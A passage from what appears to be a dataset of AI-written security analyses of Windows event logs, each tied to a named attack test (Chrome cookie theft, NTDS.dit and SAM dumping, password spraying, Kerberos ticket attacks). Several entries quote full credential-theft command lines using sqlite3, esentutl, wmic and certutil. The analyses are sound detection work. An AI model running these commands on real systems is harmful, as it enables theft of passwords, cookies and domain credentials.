3. **Incident Response**: Engage the incident response team to handle potential breaches and address vulnerabilities.
4. **Security Policies**: Review and update security policies regarding PowerShell execution and script execution from external sources. Consider implementing application whitelisting solutions."
Enumeration for PuTTY Credentials in Registry,"After analyzing the provided Windows event logs, here's a detailed assessment of the situation:

### Security Log Analysis
1. **Event ID 4616**: This event indicates that the system time was changed. The time change was initiated by the `svchost.exe` process under the `LOCAL SERVICE` account. However, frequent time changes can be indicative of malicious activity, such as an attempt to hide timestamps of certain activities.
   
2. **Event ID 4634**: This event shows a logoff of the user `admin_test`. The logoff was of type 3, which typically indicates a network logon session. No immediate issues here, but may warrant further inspection if correlated with other events.

3. **Event ID 4672**: This event logs a special privileges assignment to the user `admin_test`, including privileges such as `SeDebugPrivilege`, which can be a sign of privilege escalation. It is notable because these privileges are often targeted by malware.

4. **Event ID 4624**: This event logs a successful logon of `admin_test` using NTLM authentication from the computer `DESKTOP-3HL5B2P`. The logon type is 3 (network), and an elevated token is indicated, which might imply elevated access.

### Sysmon Log Analysis
1. Multiple instances of `wevtutil.exe`, `conhost.exe`, and `cmd.exe` executed by `admin_test` are observed. The use of `wevtutil.exe` and `conhost.exe` are not unusual, but they are consistent, indicating possible automation or script usage.
   
2. **Event ID 1 for `cmd.exe`**: This shows a command execution querying the registry for `SimonTatham\PuTTY\Sessions`. This could be an attempt to gather information about SSH sessions, which may indicate reconnaissance or credential gathering activity.

3. **Event ID 1 for `whoami.exe`**: A typical command used to verify user access, which could be benign or used in preparing for further actions.

### System Log and Application Log Analysis
1. Logs show multiple activities related to Microsoft Edge Update, which appear typical for scheduled updates or installations. However, these entries show significant network activity, possibly involving remote servers, implying regular operations but needing further context.

### Conclusion
The logs demonstrate some activity patterns that could be suspicious:
- The special privileges granted to `admin_test` could be attempted privilege escalations.
- Use of `cmd.exe` to query SSH sessions and other `wevtutil` usage is potentially suspicious, especially if corroborated with external alerts.
- Certain security-sensitive actions like time change should be correlated with other logs to rule out malicious intent.

Based on the analysis, the behavior patterns imply automation or script usage that needs further exploration, especially to verify if these activities are expected for the user or anomalous. 

### Recommendations
- Further investigation should be conducted to determine if the `admin_test` account's behavior aligns with expected activities.
- Review the context of the time change events and any correlations with other suspicious actions.
- Verify if the high privilege assignments were legitimate.

### Final Resolution
Given the potential indicators of suspicious activity that might lead to a malicious conclusion after detailed verification, the resolution is set to:
- **SUSPICIOUS** - There is activity that doesn't look right and requires more investigation."
Create Volume Shadow Copy with Powershell,"**Detailed Analysis:**

1. **PowerShell Logs:**
   - The logs contain various PowerShell activities indicating the creation of a shadow copy using the `win32_shadowcopy` class. The command `powershell.exe & {(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')}` suggests an attempt to create a volume shadow copy. This activity, while legitimate for backup purposes, could be used maliciously to bypass file locks and copy data without alerting other systems.
   - There are multiple entries indicating starting states for different providers such as Registry, Alias, Environment, FileSystem, etc., under the same command execution, which is typical under normal circumstances when PowerShell starts.

2. **Sysmon Logs:**
   - The logs indicate various process creations such as `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`, which is not uncommon as these processes are benign on Windows systems. However, frequent invocation of `wevtutil.exe` could be suspect if it's used to clear event logs or query sensitive log data.
   - `powershell.exe` is executed with high integrity, which aligns with the execution of the PowerShell command noted earlier. The process creation captured in the Sysmon logs corroborates the PowerShell activity.
   - Processes such as `HOSTNAME.EXE`, `whoami.exe`, and others were also seen executing. These do not inherently raise suspicion unless used in conjunction with malicious activity.

3. **Security Logs:**
   - There are several events related to privilege assignments (EventID 4672), successful logon (EventID 4624), and audit log creation for processes like `VSSVC.exe`. The usage and successful logs with system-level privileges might be innocuous, but consistent monitoring of privileged activities is warranted.
   - There is an interesting anomaly regarding frequent credential access failures (EventID 5379) related to `MicrosoftAccount:user=02txoixylodcstop`, which is repeatedly failing. This could be a misconfiguration or an indicator of an attempt to access credentials improperly.

4. **System Logs:**
   - Time change events (EventID 1) are recorded, which could be regular system time sync operations. However, unexpected time changes can be indicative of attempts to hide tracks by altering system timestamps.
   - The update events related to Microsoft Defender Antivirus are typically benign and part of regular security update operations.

**Assessment and Resolution:**
- There is evidence of `win32_shadowcopy` utilization which, if not expected or documented, could point to potential exploitation tactics such as unauthorized data access or data exfiltration practices.
- The credential access failures are noteworthy and should be examined to rule out unauthorized access attempts.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Evaluate the Justification:**
   - Confirm whether the shadow copy attempt was legitimate by checking scheduled tasks, backup procedures, or querying the responsible team if such operations are part of their routine tasks.

2. **Examine Credential Access Issues:**
   - Investigate the context and origin of repeated credential access failures with EventID 5379 to determine if these correspond to unauthorized access attempts.

3. **Continuous Monitoring:**
   - Set up advanced alerts for any subsequent shadow copy or privilege escalations on this system and monitor for enhancements or deviations from expected baseline activities.

4. **Further Investigation:**
   - Consider engaging with the user `admin_test` to verify the legitimacy of high privilege actions recorded in the logs.
   - Perform a comprehensive audit on event logs related to `wevtutil.exe` to ensure that there's no suspicious usage related to log clearance or unauthorized log access."
Steal Chrome Cookies (Windows),"### Detailed Analysis of Logs

1. **Sysmon Log Observations:**
   - Multiple instances of PowerShell execution were observed, particularly `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` being executed by the user `SERVER002\admin_test`.
   - The PowerShell command executed is notable: 
     ```shell
     powershell.exe & {stop-process -name \\\""\""chrome\\\""\"" -force -erroraction silentlycontinue, \\\""\""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\\\""\"" | cmd /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \\\""\""$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\\\""\"" | out-file -filepath \\\""\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\dataChromeCookies.txt\\\""\""}
     ```
     - This command indicates that there is an attempt to extract cookie data from Google Chrome's directory using `sqlite3`, which is potentially indicative of credential dumping activity.

2. **PowerShell Log Observations:**
   - Corresponding PowerShell events showed that various providers such as Registry, Alias, Environment, etc., started with the same command which aligns with the Sysmon logs.
   - The PowerShell command being used is tailored to stop Chrome processes and extract cookies, which is not typical for legitimate administrative tasks and implies an attempt to obtain potentially sensitive browsing information without authorization.

3. **Edge Update Activity:**
   - There are multiple entries related to `Microsoft Edge Update` processes which appear normal given the context and versioning matches with standard updates, indicating these processes likely are not involved with the malicious activity.

4. **Summary of Anomalies:**
   - The execution of a PowerShell script to forcibly stop a browser process and extract cookies indicates unauthorized access or malicious activity aimed at data extraction.
   - Such activity, especially executed under a high integrity level, suggests potential compromise or misuse of elevated privileges by `SERVER002\admin_test`.

### Threat Assessment and Resolution

Given the above observations, the logs suggest potentially **malicious activity** specifically related to:
- **Unauthorized access:** Attempts to access and extract sensitive information from a user's Chrome cookie storage via PowerShell script.
- **Credential Dumping Risk:** The specific targeting of cookie data suggests a motive to capture session cookies or stored passwords within the Chrome browser, which is a common tactic in credential theft.

### Guidance on How to Proceed

1. **Immediate Actions:**
   - **Isolate the host:** Disconnect Server002 from the network to prevent any potential exfiltration or lateral movement.
   - **Inform IT and Incident Response:** Notify your incident response and IT teams to start an investigation and contain the threat.

2. **Conduct Deep Analysis:**
   - Perform a more in-depth forensic analysis of Server002, focusing on PowerShell activity logs and any retrieved data files.
   - Analyze network activity for any unusual outbound traffic from Server002 that might indicate exfiltration.

3. **Review Access and Permissions:**
   - Inspect user `SERVER002\admin_test` to determine how this account was able to execute potentially malicious scripts and if there was any misuse of privileges.

4. **Remediation Steps:**
   - Reset credentials and relevant security policies for the affected administration accounts.
   - Review and revise security settings on Server002 and ensure strict endpoint monitoring.

In conclusion, the logs are categorized under the resolution: **MALICIOUS.**"
Create Volume Shadow Copy remotely (WMI) with esentutl,"**Analysis of the Windows Event Logs for Potential Malicious Activity:**

The collected logs from various sources reveal a pattern that is suspicious and warrants further investigation. Let's break down the important findings:

1. **Security Log (EventID 4799):**
    - **Key Details:**
        - TargetUserName: ""Administrators""
        - CallerProcessName: ""C:\\Windows\\System32\\esentutl.exe""
        - SubjectUserName: ""admin_test""
    - **Note:** The presence of esentutl.exe being associated with administrative actions and the attempt to interact with the ""Administrators"" group could suggest unusual activity.

2. **Sysmon Log (EventID 1 - Process Creation):**
    - **Suspicious Command Execution:**
        - CommandLine: `""cmd.exe"" /c wmic /node:""localhost"" process call create ""cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit""`
    - **Analysis:**
        - The command is particularly concerning as it involves copying or interacting with the NTDS.dit file, which contains Active Directory data including user credentials. This activity is common in credential dumping attacks.
        - The use of tools such as `wmic`, `esentutl.exe`, and manipulation of the NTDS.dit file, especially under a user context like ""admin_test"", is indicative of a potential attack aimed at extracting sensitive user data from Active Directory.

3. **Long Sequence of `wevtutil.exe` and `conhost.exe` executions:**
    - **Details:**
        - Multiple executions of these processes within a short time span which generally isn't a routine behavior.
    - **Interpretation:**
        - This could be a red flag indicating log clearing or manipulation attempts, a common tactic after credential theft.

4. **Application Log (EventID 13 and 8193 - VSS):**
    - **Observations:**
        - Errors like ""CoInitialize has not been called"" related to VSS (Volume Shadow Copy Service) hint at potential issues or exploitation attempts surrounding shadow copies, which may be related to preparation for copying sensitive files.
   
5. **Microsoft Edge Installation Events:**
    - **Findings:**
        - While there are common system level installations/upgrades, they appear legitimate and not immediately tied to the observed attacks.

6. **Overall User Activity and Correlations:**
    - All suspicious activities are linked to the user ""SERVER002\\admin_test"". The timing, choice of tools, and command execution points to potential unauthorized or malicious actions executed under this user account.

**Conclusion and Resolution:**

The analyzed logs exhibit suspicious activities focusing on the use of system utilities for potentially malicious purposes, especially concerning credential dumping and unauthorized system access. Given these findings, the log entries suggest more than just anomalous behavior but indicators typical of a targeted attack and credentials compromise.

Password Spray using Kerbrute Tool,"Upon analyzing the provided Windows event logs, here are the key findings:

1. **Sysmon Logs:**
   - **PowerShell Execution:** There is an execution of PowerShell with a suspicious command-line argument: `"".\\script.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\passwordspray.txt\"" password132""`. This suggests a potential password spraying attack, attempting to guess passwords for user accounts by utilizing a list of passwords, which is a common reconnaissance or initial access tactic by attackers.
   - **Process Execution:** There are multiple process executions involving `wevtutil.exe`, `conhost.exe`, and other command-line utilities that are indicative of system enumeration and potential log manipulation (exporting logs with `wevtutil`).

2. **Security Logs:**
   - No direct signs of unauthorized logons or modification of user accounts, but privileged use is prevalent as indicated by the logon sessions and manipulation activities.

3. **PowerShell Logs:**
   - Reaffirm the execution of a potentially malicious PowerShell script aimed at executing a password spraying attack.

4. **Other Logs:**
   - Application logs show the Windows Defender is on, but no specific alerts about this activity—suggests that if malicious, the activity might be bypassing or unnoticed by default scanning mechanisms.

**Assessment:**
- **Malicious Activity Indication:** The use of a PowerShell script for executing a password spray attack is a clear indicator of potential malicious activity. Password spraying is a technique used to breach systems with weak passwords en masse.

**Recommendations:**
- **Immediate Investigation:** Given the nature of the activity, this should be classified as MALICIOUS. It warrants immediate action:
  - Isolate the affected machine to prevent further lateral movement.
  - Conduct full forensic analysis to track potential access or changes made by the attacker.
  - Review audit logs for any unauthorized access or changes.
  - Change passwords and enforce strong password policies across the network.
  - Monitor for recurring activity or similar patterns on the network for early detection of similar attacks.
  
**Resolution: MALICIOUS** - The activity observed in the logs is indicative of malicious intent and requires thorough investigation and remediation."
Dump Chrome Login Data with esentutl,"Upon analyzing the provided Windows event logs, several points warrant attention and further investigation due to potential indicators of suspicious activity:

1. **Unusual Execution of PowerShell**:
   - We see an execution of `powershell.exe` by the user ""SERVER002\\admin_test."" PowerShell is often used legitimately, but it is also a common tool for attackers due to its powerful scripting capabilities. Since there's no additional context or command-line arguments provided, it's difficult to ascertain the intent. However, any unexpected use of PowerShell warrants further investigation.

2. **Repeated Use of `wevtutil.exe`**:
   - The `wevtutil.exe` command was initiated multiple times, and it's used for managing event logs. Repeated access to this utility can indicate attempts to clear or tamper with event logs to cover tracks. This activity is flagged as suspicious, especially given the volume of executions in a short time span.

3. **Execution of `cmd.exe` and `esentutl.exe` for Access to Chrome Login Data**:
   - The command `cmd.exe /c esentutl.exe /y ""%%LOCALAPPDATA%%\Google\Chrome\User Data\Default\Login Data"" /d ""%%temp%%\data.003_Login_Data.tmp""` suggests that an attempt is made to copy or manipulate login data from Google Chrome. `esentutl.exe` is a built-in Windows command-line tool to manage the Extensible Storage Engine (ESE) databases. This line suggests potential data extraction or manipulation, which raises a red flag and demands immediate review.

4. **Execution of `whoami.exe`**:
   - This command is generally used to view user information associated with the current session. When combined with other suspicious behavior, it might imply user reconnaissance or a step in an attempt to escalate privileges.

5. **Presence of High-Integrity Level Processes**:
   - Processes are executed with high integrity levels, indicating they have administrative privileges. This increases the risk since potential malicious actions can have significant impacts if executed under elevated privileges.

**Assessment**:
- The main points of concern are the repeated use of `wevtutil.exe`, potentially to cover tracks, and the esentutl execution targeting Chrome's login data. These activities, in the context of potentially unauthorized or unexplained use, suggest a higher likelihood of malicious intent.
  
**Guidance**:
1. Confirm whether the operations involving `powershell.exe`, `wevtutil.exe`, and `esentutl.exe` were authorized by the user or are part of any approved administrative scripts or software.
2. Conduct a thorough forensic analysis to determine what scripts, if any, were executed through PowerShell.
3. Check the system for potential signs of data exfiltration related to Google Chrome's login data.
4. Investigate the user's account activity to understand if this behavior is typical or warrants a security incident escalation.
5. Review other security controls such as network logs, DLP, and endpoint data to validate if abnormal activities are detected concurrently on this host or others.

**Resolution**: SUSPICIOUS

Further investigation is required to determine the legitimacy of these actions and to confirm or dispel concerns of a security compromise."
Create Symlink to Volume Shadow Copy,"Upon reviewing the provided Windows event logs, I have identified several points of interest, focusing on potential indicators of malicious activity, such as suspicious process executions and privilege escalations.

### Analysis Summary

1. **Process and Command Execution:**
   - **PowerShell Log:**
     - Not provided.

   - **Sysmon Logs:**
     - Frequent use of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`. The `wevtutil.exe` tool is often used for managing event logs, which could be legitimate but warrants monitoring based on context.
     - An unusually high number of process creations in a short period. This might indicate automated scripts or malicious activity trying to cover tracks or perform reconnaissance.
     - A process creating a shadow copy (`vssadmin.exe create shadow`) from `cmd.exe` suggests potential reconnaissance or data hiding/preparation for exfiltration.
     - The subsequent creation of a directory junction using `mklink` associated with `vssadmin.exe` is a technique sometimes used to access hidden data or backup files stealthily.

2. **System Logs:**
   - Events related to Windows Update (`Microsoft-Windows-WindowsUpdateClient`) appear normal and do not indicate anything out of the ordinary.

3. **Security Logs:**
   - Presence of multiple privileged rights assignment (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) to `admin_test`. While potentially legitimate in an administrative context, this should be verified against normal behavior for this account to rule out misuse or unintended privilege escalation.
   - Successful and privileged logon events (ID 4624 and 4672) for `admin_test` from external addresses `fe80::9dcf:4519:45e7:eba2` and `fe80::e3b5:5371:12a8:9c77` over NTLM protocol. Look into whether these devices and logon types are common for admin_test to determine legitimacy.
   - Event ID 5379 involving credentials might indicate attempts to access protected data without clear success (`CountOfCredentialsReturned=0` and `ReturnCode=3221226021`).

### Assessment 

- **SUSPICIOUS**: Although there are indicators of routine administrative tasks, such as process management and updates, the combination of events raises potential concerns. Specifically:
  - The creation and potential manipulation of Volume Shadow Copies is a well-known tactic used for stealth and persistence.
  - Elevated privileges and internal account activity over the network using NTLM warrants further validation to ensure it's in line with standard operational procedures.

### Guidance

1. **Further Investigation:**
   - Verify the legitimate use of administrative tools and privileges by `admin_test`, especially around the timeframe of the logs.
   - Review any automation or scheduled tasks that may explain the batch execution of commands.
   - Check if there are approved scripts or IT operations that justify the use of `vssadmin.exe` and `vwevtutil.exe`.

2. **Data Access and Network Activity:**
   - Identify the devices corresponding to the IP addresses found in the logon events to validate authenticity.
   - Examine network logs for any unusual data transfer or external communication patterns from this host.

3. **Action Plan:**
   - Consider increased monitoring of the CEO's machine due to the potential risk of privilege misuse or data exfiltration.
   - Conduct a review of the entire file system for unauthorized changes, particularly regarding shadow copies and symbolic links.

Given the context and the potential for a security risk indicated by the activity logged, this investigation warrants escalation due to its suspicious nature, but does not definitively confirm malicious activity without further context."
Rubeus asreproast,"Upon reviewing the provided Windows event logs, I've identified some activities that require further analysis to determine the context and intent behind them.

### Suspicious Activity Analysis:

1. **PowerShell Execution with External Script:**
   - **Event ID 18017:** Here, PowerShell.exe is seen running a command involving `cmd.exe /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.exe\"" asreproast`. The use of PowerShell to execute a command that triggers an executable located in a temporary directory can be indicative of malicious activity. This pattern is frequently observed in attack scenarios such as attacks involving credential dumping or reconnaissance activities.
   - **PowerShell Events (Event ID 600 series):** These corroborate the detailed execution of a script through PowerShell, which started various providers typically active during script execution. Specific actions and intent aren't specified, leaving ambiguity regarding the purpose of the script.

2. **Processes Execution Context:**
   - PowerShell, cmd.exe, and EdgeUpdate executables are running under the user `SERVER002\admin_test`, which reveals that an administrative-level account is being used. This alignment is consistent with attempts to misuse elevated privileges in lateral movement or privilege escalation attempts.
   - The `cmd.exe` execution aligns with a suspicious pattern where PowerShell is used to escalate or perform unauthorized actions.

3. **Indicators of Malicious Intent:**
   - The command executed appears to be akin to activities in penetration testing tools or techniques (ASREPROAST being part of Active Directory attack techniques). If this wasn’t initiated by a legitimate security team or tool as part of a scheduled task or security assessment, it would be considered highly suspicious.
   - **Hash Consistency and Executable Integrity:** No deviations in hashes are readily available as these are regular Microsoft-signed binaries being used in potentially malicious ways.

4. **Running and Stopping Services:**
   - Frequent stopping and starting of the edgeupdate service and the repeated registration attempts don't typically equate to typical user-level operations, and their timings need to be correlated with expected updates.

5. **External Script or Tool:**
   - The reference to an external script within a temporary folder without immediate context of authorized activity heightens suspicion. Such directories are often used to place executable payloads by attackers.

### Assessment & Recommendation:
The presence of command line execution patterns linked with administrative privileges, execution from temporary directories, and lack of immediate contextual evidence that these are initiated by sanctioned security testing strongly indicate potentially suspicious activity.

- **Resolution:** **SUSPICIOUS**
- **Recommended Actions:**
  1. Verify whether the execution of `script.exe` was part of a legitimate security exercise. Check with IT or security teams for any scheduled penetration tests.
  2. Analyze the script content (if still available) and any outputs it may have generated.
  3. Conduct a thorough review and audit of administrative session activities on the system, especially for other commands or unexpected behaviors in conjunction with these activities.
  4. Ensure effective endpoint detection and response mechanisms to capture further context for similar events in future and restrict unnecessary PowerShell execution.
  5. If unauthorized, consider isolating the host pending a deeper forensic exploration and review of network activity to ensure no broader compromise."
Crafting Active Directory golden tickets with Rubeus,"Based on the analysis of the provided Windows event logs, several observable behaviors suggest potential malicious activity indicative of a Kerberos ticket attack, commonly known as a ""Golden Ticket"" attack. Below is a detailed breakdown:

1. **PowerShell Activities**:
   - The PowerShell logs reveal the execution of a script attempting to manipulate Kerberos tickets. Specifically, processes are using commands like `klist purge` and reading a ticket file (`kirbifile`), which is a clear indicator of Kerberos ticket manipulation.
   - There is the creation and execution of batch files rooted in temporary locations with names like `golden.bat`, and output directed to `golden.txt`, which are suspicious given the context.
   - The script also includes running `dir` commands against the SYSVOL with ticket management commands, indicating a possible attempt to access domain controller resources illegitimately.

2. **Process and Sysmon Events**:
   - Multiple processes related to `cmd.exe`, `conhost.exe`, and `runas.exe` run in quick succession. The `runas.exe` was used for creating a ""netonly"" session using fake credentials, suggesting an attempt to masquerade a session without alerting the system's usual user environment.
   - High-privilege operations are apparent during these events, highlighted by the execution integrity level set to High for relevant processes.

3. **Security and Audit Logs**:
   - There are multiple instances of privilege escalation for the user `admin_test`, as seen in EventID 4672.
   - The logs also include entries of unsuccessful credential access attempts (EventID 5379), which could correlate with attempts to fetch or manipulate credentials illicitly.
  
4. **General Patterns**:
   - The timing of events within seconds of each indicates an automated or scripted attack rather than legitimate administrative operations.
   - The context of temp files and fake user sessions strongly links these activities with unauthorized and covert actions.

**Assessment**:
- The observed behavior aligns with an attempt to manipulate Kerberos tickets to obtain unauthorized access across network services, typical of Golden Ticket attacks. The combination of `klist` usage, PowerShell script manipulation, high-privilege processes, and session impersonation supports this hypothesis.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediate isolation of the affected systems to prevent further unauthorized access or spread.
- Revoke and recreate Kerberos tickets for all domain accounts to mitigate ticket-based compromises.
- Conduct a thorough investigation to identify any other compromised accounts or systems.
- Strengthen monitoring and alerting systems to quickly detect similar patterns of behavior in the future.
- Perform a full incident response and forensics analysis to assess the scope and impact of the attack.

In summary, the logs present significant evidence of malicious activity, warranting a full-scale incident response to remediate and prevent further threat actions."
Password Cracking with Hashcat,"Based on the analysis of the provided logs, several events are observed indicating potential suspicious activities:

### Analysis:
1. **Privileges and System Access:**
   - Multiple instances of Security Event ID 4672 indicate the assignment of Special Privileges. This includes SeDebugPrivilege, which allows processes to debug other processes, and potentially indicates high-level access. This is concerning if not expected on a CEO's machine, especially without clear justification.

2. **Command-Line Activities:**
   - The Sysmon event logs indicate the execution of ""hashcat.exe,"" a known password-cracking utility, by the user ""admin_test."" The command line arguments show it was executed to crack a SAM file with a specific rule for password cracking (`Incisive-leetspeak.rule`).
   - Use of a tool like hashcat on a high-profile machine such as the CEO's could indicate an attempt to extract credentials or perform unauthorized actions.

3. **Process Execution:**
   - The presence of processes like ""cmd.exe"" and ""powershell.exe"" in contexts suggesting command-line scripting or automated tasks could be part of a threat actor's toolkit, especially given that they were spawned by another automated system process (e.g., ""wsmprovhost.exe"").

4. **Failed Credential Access Attempts:**
   - Repeated 5379 events showing attempts to access credentials for a Microsoft account indicate multiple failed access attempts. This could imply an attempt to breach or escalate privileges illicitly.

5. **Execution Context:**
   - Many of the potentially malicious processes are running in a high-integrity context, suggesting they were run with elevated privileges, which poses an increased security risk.

### Recommendation:
- **Immediate Response:**
  - Isolate the affected machine to prevent any further potential exfiltration or damage.
  
- **Further Investigation:**
  - Examine the user ""admin_test"" for any potential misuse or account compromise.
  - Investigate and audit all activities involving ""hashcat.exe"" to understand the scope of use and context and verify if this activity was authorized.
  - Conduct a review of all scheduled tasks and automated processes to identify any unauthorized or malicious configurations that could trigger such tools.

- **Mitigations:**
  - Revoke unnecessary user privileges.
  - Implement stronger monitoring and alerting for any reuse of tools identified as suspicious, such as password crack attempts, across the network.
  - Implement stricter controls on the use of PowerShell and command-line interfaces.
  
### Resolution:
Given the evidence of password cracking, privilege escalation attempts, and lack of legitimate justification for using a tool like hashcat on the CEO's machine, the activity can be classified as:

**MALICIOUS**"
Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos),"**Detailed Analysis of Logs:**

Upon reviewing the collected Windows event logs, the analysis is as follows:

**System Logs:**
1. The entries mostly detail normal system operations like time synchronization, with svchost.exe involved, commonly seen in Windows environments.

**Security Logs:**
2. Events are logged under the process svchost.exe with the LOCAL SERVICE account, typical for time change notifications and do not indicate any signs of privilege escalation or unsanctioned accesses.

**Sysmon Logs:**
3. Execution of `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `powershell.exe` are noted.
4. A notable detail is the execution of PowerShell with an elaborate script designed to iterate through domain users and attempt credential validation using a common password. This is indicative of a password spraying attack.
5. `PowerShell.exe` invocation is logged with command-line arguments suggesting an attempt to authenticate against Active Directory using NTLM. This command heavily suggests automated credential guessing or a password spraying attempt which is a known method of attempting compromise.

**PowerShell Logs:**
6. PowerShell logs reinforce the suspicious nature of the command-line invocation seen in the Sysmon logs. The commands executed are consistent with malicious activity targeting user accounts through credential testing.

**Assessment and Findings:**
- **Anomalous Behavior:** Execution of a PowerShell script aiming to perform a password spraying attack is discovered, indicative of potential malicious intent.
- **Malicious Activity:** The PowerShell command executed is not typical of standard administrative activity and suggests an effort to compromise credentials.

**Resolution:**
- **MALICIOUS -** Based on the execution of PowerShell with suspicious command-line arguments aimed at automated credential testing against Active Directory, this activity is definitively malicious.

**Guidance & Next Steps:**
1. **Immediate Actions:**
   - Isolate the affected machine to prevent further attempted compromises.
   - Revoke any potential leaked credentials and enforce password changes.
2. **Further Investigation:**
   - Conduct a thorough review to discover potential sources of the malicious script.
   - Monitor network traffic for any suspicious connections or anomalies.

   - Enhance logging and monitoring for early detection of similar activities.
   - Implement account lockout policies and use stronger authentication mechanisms like MFA.
   - Consider conducting a security awareness workshop emphasizing password security.
"
dump volume shadow copy hives with certutil,"Upon reviewing the provided Windows event logs from the CEO machine, here is the detailed analysis concerning the potential indicators of compromise or malicious activity:

### Analysis:

1. **Sysmon Logs:**
   - The Sysmon events show process creation and file activity related to several processes, notably `cmd.exe`, `certutil.exe`, and interactions with volume shadow copies of the SAM registry hive. The command observed:
     ```plaintext
     ""cmd.exe"" /c for /L %%a in (1,1,10) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%%a\Windows\System32\config\SAM"" %%temp%%\SAMvss%%a 2 >nul 2>&1) & dir /B %%temp%%\SAMvss*
     ```
     - The use of `certutil.exe` to encode files extracted from volume shadow copies is highly suspicious. `certutil.exe` is a known utility that can be misused by attackers to encode/decode or manipulate files and is often seen in attempts to exfiltrate sensitive data like password hashes from the SAM database.
     - There is a loop, iterating through shadow copies, which indicates an attempt to systematically extract information from possibly multiple shadow copies.
     - The actions are executed with a high-integrity level and from an administrative account (`SERVER002\admin_test`), suggesting elevated privileges.
     - `cmd.exe` and `certutil.exe` running in such context, especially accessing SAM files, is a strong indicator of malicious activity focused on credential extraction.

2. **Application Logs:**
   - Events from the `Microsoft-Windows-Security-SPP` do not directly indicate malicious activity but coincide in timing which is irrelevant to the identified suspicious behavior in Sysmon logs.

3. **Other Logs:**
   - The absence of significant entries in other logs (e.g., PowerShell, Security) does not detract from the highly suspicious activity observed in the Sysmon logs.

### Conclusion:

Based on the pattern of activity and observed behavior:

- There is definitive evidence of process executions and commands that are characteristic of advanced persistent threat (APT) techniques and attempts to access sensitive information (e.g., SAM database).
- Use of legitimate tools (Living off the Land Binaries - LOLBins) like `certutil.exe` in this manner is classic for data exfiltration or credential dumping attempts.

### Recommendation:

- **Resolution:** MALICIOUS
- **Guidance:**
  - Immediately isolate the host `Server002` from the network to prevent further data exfiltration.
  - Conduct a comprehensive forensic analysis of the system to determine the full scope of compromise, including reviewing all installed software, network connections, and file modifications around the time of suspicious activity.
  - Reset all potentially compromised credentials, focusing on administrative and sensitive accounts.
  - Assess and enhance security controls to detect and prevent such misuse of shadow copies and built-in binaries.
  - Review and implement additional logging and monitoring measures to detect similar activities in the future."
Dump Credential Manager using keymgr.dll and rundll32.exe,"Upon reviewing the provided Windows event logs, several activities stand out as potentially suspicious and warrant a detailed analysis:

### Security Log Observations:
1. **Event ID 4672 (Special Logon):** 
   - The `admin_test` user is granted a wide array of privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeBackupPrivilege`. These privileges are powerful and, if misused, could allow system-level changes or access to sensitive data.

2. **Event ID 4624 (An account was successfully logged on):**
   - There are successful logons using NTLM authentication from a remote workstation (DESKTOP-3HL5B2P). The use of NTLM can be normal, but it could also indicate lateral movement or remote access by an adversary, especially considering the high privileges associated with the user account.

3. **Event ID 5379:**
   - This event indicates an anomaly with credential access (`CountOfCredentialsReturned` is 0 and `ReturnCode` is 3221225567). This could represent a failed attempt to retrieve credential information.

### Sysmon Log Observations:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The repeated calls to `wevtutil.exe` and `conhost.exe` by `admin_test` within a single second suggest potential tampering with event logs or a scripted automation attempt. `wevtutil.exe` is commonly used to query or clear event logs, which could be indicative of cover-up activities.

2. **Execution of PowerShell with rundll32 and keymgr, content:**
   - `powershell.exe` is executed with a command that calls `rundll32.exe` and `keymgr`. The function `KRShowKeyMgr` is usually benign, but using it in this context and the lack of clarity regarding its purpose suggest potential misuse or credential harvesting attempts.

3. **Use of `whoami.exe`:**
   - The execution of `whoami.exe` is a common tactic for adversaries to verify their privileges on a machine, which by itself isn't malicious but could indicate post-exploitation reconnaissance.

### PowerShell Log Observations:
- The PowerShell logs corroborate the execution noted in the sysmon logs, emphasizing the non-standard use of `rundll32.exe` in conjunction with PowerShell.

### Application Log Observations:
- A benign entry concerning a Microsoft link is not typically associated with malicious activity.

### Assessment:
The combination of high privilege usage, frequent execution of logging utilities (`wevtutil.exe`), unusual command-line usage of `rundll32` with PowerShell, and attempts to access credentials suggest potential misuse or compromise. Such activities, especially when combined, are alarming and suggest attempts at maintaining persistence, recon, and potentially obscuring activities.

### Resolution:
Based on the analysis, the activity is classified as **MALICIOUS** due to:
- Possible inappropriate use of privileges.
- Repeated and swift executions of utilities related to process and event management.
- Unusual and potentially obfuscated PowerShell commands.

### Guidance and Next Steps:
1. **Immediate Containment:**
   - Isolate the system `Server002` to prevent further lateral movement or data exfiltration.
   
2. **Thorough Investigation:**
   - Conduct a full forensic analysis on `Server002` to understand the depth and breadth of the compromise.
   - Review additional logs, examine other processes executed during this time, and look for any changes to sensitive files.

3. **Remediation:**
   - Reset or audit credentials associated with the `admin_test` account and any accounts with similar access.
   - Implement multi-factor authentication and monitor all remote logins for anomalies.
   - Strengthen logging and monitoring on key systems to catch similar activities promptly.

Proceed with the occurrences documented here and consider engaging incident response to fully scope and remediate the breach."
WinPwn - Loot local Credentials - mimi-kittenz,"Upon reviewing the provided logs from the System, Application, Windows PowerShell, Sysmon, and Security logs, the following observations can be made:

1. **System Log:**
